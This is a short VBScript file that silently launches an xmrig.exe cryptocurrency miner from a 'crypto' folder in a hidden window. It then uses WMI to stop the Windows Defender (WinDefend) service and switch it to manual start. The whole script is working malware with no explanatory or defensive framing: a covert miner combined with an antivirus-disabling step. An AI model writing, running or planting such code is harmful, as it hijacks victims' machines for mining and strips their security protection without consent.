Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.CurrentDirectory = ".\crypto"
WinScriptHost.Run Chr(34) & "xmrig.exe" & Chr(34), 0
Set WinScriptHost = Nothing

Set ServiceSet = GetObject("winmgmts:").ExecQuery _
("select * from Win32_Service where Name='WinDefend'")
For Each Service In ServiceSet
   RetVal = Service.StopService() 
   If RetVal <> 0 Then 
      MsgBox "Error " & RetVal
   End If
   Service.ChangeStartMode("Manual")
Next
